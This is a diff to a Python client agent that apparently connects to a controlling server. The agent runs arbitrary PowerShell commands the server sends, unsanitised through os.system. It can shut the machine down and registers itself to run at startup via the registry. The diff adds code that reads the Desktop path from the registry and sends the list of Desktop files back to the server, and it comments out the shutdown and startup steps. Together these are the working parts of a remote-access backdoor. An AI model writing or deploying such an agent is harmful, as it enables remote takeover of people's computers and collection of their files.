@@ -5,6 +5,7 @@ import socket
 import sys
 import threading
 import time
+import winreg
 import winreg as reg
 
 def load_config(file_path: str) -> dict:
@@ -56,6 +57,17 @@ def shutdown_computer():
         print("ОS not supported")
 
 
+def get_desktop_path():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
+        path, _ = winreg.QueryValueEx(key, "Desktop")
+        winreg.CloseKey(key)
+        return path
+    except Exception:
+        return os.path.join(os.path.expanduser("~"), "Desktop")
+
+
 def receive(client) -> None:
     global running, connected
 
@@ -82,11 +94,41 @@ def receive(client) -> None:
                     if p_type == "command":
                         if packet.get("command") == "shutdown":
                             print("Shutting down...")
-                            shutdown_computer()
+                            # shutdown_computer()
                         elif packet.get("command") == "powershell":
                             ps_data = packet.get('data')
                             print(f"Opening Powershell with command: {ps_data}")
                             os.system(f'start powershell -NoExit -Command "{ps_data}"')
+
+                    elif p_type == "request":
+                        if packet.get("command") == "files":
+                            print("Collecting desktop files...")
+
+                            desktop_path = get_desktop_path()
+
+                            try:
+                                if os.path.exists(desktop_path):
+                                    files_list = os.listdir(desktop_path)
+                                    print(f"Found {len(files_list)} items")
+
+                                    response = {
+                                        "type": "response",
+                                        "command": "files",
+                                        "data": files_list,
+                                    }
+                                else:
+                                    raise Exception(f"Path not found: {desktop_path}")
+
+                            except Exception as e:
+                                print(f"Agent error: {e}")
+                                response = {
+                                    "type": "error",
+                                    "message": str(e)
+                                }
+
+                            response_bytes = (json.dumps(response) + "\n").encode("utf-8")
+                            client.sendall(response_bytes)
+
 
             except socket.timeout:
                 continue
@@ -147,8 +189,8 @@ def start():
 
 if __name__ == "__main__":
     # remove_from_startup()
-    if platform.system().lower() == "windows":
-        add_to_startup()
+    # if platform.system().lower() == "windows":
+    #     add_to_startup()
 
     try:
         start()
